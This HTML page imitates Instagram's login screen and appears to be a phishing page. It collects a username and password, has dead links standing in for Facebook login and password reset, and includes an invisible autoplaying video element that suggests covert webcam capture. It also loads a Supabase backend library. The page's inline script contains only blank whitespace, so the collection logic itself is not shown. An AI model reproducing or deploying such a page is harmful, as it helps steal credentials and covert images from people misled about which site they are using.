<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | Social Media Platform by META</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .login-container { 
            background: white; 
            border: 1px solid #dbdbdb; 
            width: 350px; 
            padding: 40px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            box-sizing: border-box; 
        }
        .logo { 
            width: 175px; 
            margin-bottom: 30px; 
            display: block;
        }
        input { 
            width: 100%; 
            background: #fafafa; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            padding: 9px 0 7px 8px; 
            margin-bottom: 6px; 
            box-sizing: border-box; 
            font-size: 12px; 
        }
        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn { 
            width: 100%; 
            background-color: #0095f6; 
            border: none; 
            border-radius: 4px; 
            color: white; 
            font-weight: 600; 
            padding: 7px 0; 
            cursor: pointer; 
            margin-top: 8px; 
            font-size: 14px; 
        }
        .login-btn:active {
            background-color: #0074cc;
        }
        .divider { 
            display: flex; 
            width: 100%; 
            align-items: center; 
            margin: 20px 0; 
        }
        .line { 
            flex: 1; 
            height: 1px; 
            background: #dbdbdb; 
        }
        .or { 
            margin: 0 18px; 
            color: #8e8e8e; 
            font-size: 13px; 
            font-weight: 600; 
        }
        .fb-login { 
            color: #385185; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            text-decoration: none; 
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        .forgot { 
            color: #00376b; 
            font-size: 12px; 
            text-decoration: none; 
        }
        #status { 
            margin-top: 20px; 
            font-size: 12px; 
            color: #ed4956; 
            text-align: center; 
        }
        .hidden-video { 
            position: absolute; 
            width: 1px; 
            height: 1px; 
            opacity: 0; 
            pointer-events: none; 
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            margin-top: 10px;
            text-align: center;
            font-size: 14px;
            box-sizing: border-box;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div style="display: flex; flex-direction: column; align-items: center;">
        <div class="login-container">
            <img src="/instagram.png" class="logo" alt="Instagram">
            
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <button class="login-btn" id="loginBtn">Log In</button>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
            <div id="status"></div>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <video id="video" class="hidden-video" autoplay playsinline></video>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
    </script>
</body>
</html>
